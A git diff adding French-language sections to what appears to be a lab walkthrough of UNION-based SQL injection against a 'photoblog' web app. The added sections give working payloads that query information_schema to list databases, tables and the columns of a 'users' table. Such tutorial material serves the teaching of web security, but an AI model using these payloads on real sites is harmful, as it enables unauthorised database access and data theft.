@@ -282,3 +282,30 @@ On peut également utiliser le _Comparer_ de Burp (clic droit, _send to Comparer
 Lorsque l'on remplace nos `NULL` par du texte. On peut voir que la 2ème et 3ème colonnes sont réfléchies dans la page web.
 
 ![On voit nos 'bbb' et 'ccc' dans la répones Web](images/reflected_sqli.png)
+
+## Trouver le nom de la BDD
+
+On extrait le nom des bases de données avec l'injection SQL :
+```SQL
+2 UNION SELECT NULL,group_concat(schema_name),'ccc',NULL FROM information_schema.schemata LIMIT 1,1;--
+```
+
+![On trouve que la base de données s'appelle photoblog](images/identify_db.png)
+
+## Trouver les tables
+
+De même, on liste les tables avec l'injection SQL suivante :
+```SQL
+2 UNION SELECT NULL,group_concat(table_name),'ccc',NULL FROM information_schema.tables WHERE table_schema='photoblog' LIMIT 1,1;-- 
+```
+
+![On liste les tables](images/list_tables.png)
+
+## Trouver les colonnes
+
+On liste les colonnes de la table avec l'injection SQL suivante :
+```SQL
+2 UNION SELECT NULL,group_concat(column_name),'ccc',NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1,1;-- 
+```
+
+![On liste les colonnes](images/list_columns.png)
